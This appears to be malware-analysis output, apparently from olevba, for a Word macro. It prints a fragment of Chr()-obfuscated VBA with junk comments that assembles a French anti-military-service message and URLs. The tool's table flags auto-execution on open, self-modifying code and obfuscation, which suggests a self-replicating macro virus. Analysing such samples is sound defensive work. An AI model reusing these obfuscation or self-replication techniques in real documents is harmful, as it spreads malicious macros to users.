c1 = "Ils" + Chr(32) + "sont" + Chr(32) + "environ" + Chr(32) + "250" + Chr(32) + "000" + Chr(32) _
+ "jeunes" + Chr(32) + "citoyens," + Chr(32) + "sursitaires," + Chr(32) + "à" + Chr(32) + "devoir" + Chr(32) ' wctbxqqfbnwxc
c1 = c1 + "effectuer" + Chr(32) + "notre" + Chr(32) + "service" + Chr(32) + "militaire." + Chr(32) + "250" + _
Chr(32) + "000" + Chr(32) + "étudiants," + Chr(32) + "salariés," + Chr(32) + "rêveurs," + Chr(32) ' hwjyfokyaw
c1 = c1 + "entrepreneurs," + Chr(32) + "chômeurs," + Chr(32) + "voyageurs": b2 _
= Chr(32) + "ou" + Chr(32) + "tout" + Chr(32) + _
"simplement" + Chr(32) + "amoureux" + Chr(32) + "qui" + Chr(32) + "ont" + Chr(32) + "d" _
+ Chr(39) + "autres" + Chr(32) + "projets" + Chr(32) + "de" + Chr(32) + "Vie" + Chr(32) ' ejreoyafo
b2 = b2 + "pour" + Chr(32) + "ces" + Chr(32) + "10" + Chr(32) + "mois." + Chr(32) + _
"Ils" + Chr(32) + "refusent" + Chr(32) + "d" + Chr(39) + "effectuer" + Chr(32) _
+ "un" + Chr(32) + "service" + Chr(32) + "inégalitaire" + Chr(32) ' lrihx
b2 = b2 + "et" + Chr(32) + "dépassé," + Chr(32) + "bref" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "qui" + Chr(32) + "ne" + Chr(32) + "sert" + Chr(32) + "plus" _
+ Chr(32) + "rien." ' pimunigemosrq
b1 = "Mobilisons-nous" + Chr(32) + "!" + Chr(13) + Chr(13) + "Pétition" _
+ Chr(32) + "pour" + _
Chr(32) + "les" + Chr(32) _
+ "sursitaires" + Chr(32) + "sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail:": b1 = b1 + Chr(32) + "http://sn.agat.net" + Chr(13) + "La" + Chr(32) + "révolte" + Chr(32) + "du" + Chr(32) + "service" + Chr(32) + "militaire:" + Chr(32) + "http://altern.org/gigm/service.htm" + Chr(13): a1 = "La" _
+ Chr(32) + "pétition" + Chr(32) + "du" + Chr(32) + "magazine" + Chr(32) + "Don" + Chr(32) + "Quichotte:" + Chr(32) + "http://www.donquichotte.com" + Chr(13) + "Non" + Chr(32) + "au" + Chr(32) + "S.N." ' idpb
a1 = a1 + _
Chr(32) + "qui" + Chr(32) + "tue" + Chr(32) + "l" + Chr(39) + "emploi:" + Chr(32) + "http://www.multimania.com/antisn" ' yjwtzrzp
e4 = Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101): j17 = Chr(69) + Chr(110) + Chr(100) ' ffinbhokykhktyy
c7 = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98): End Sub ' moqpjw

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://sn.agat.net  |URL                                          |
|IOC       |http://altern.org/gi|URL                                          |
|          |gm/service.htm      |                                             |
|IOC       |http://www.donquicho|URL                                          |
|          |tte.com             |                                             |
|IOC       |http://www.multimani|URL                                          |
|          |a.com/antisn        |                                             |
+----------+--------------------+---------------------------------------------+

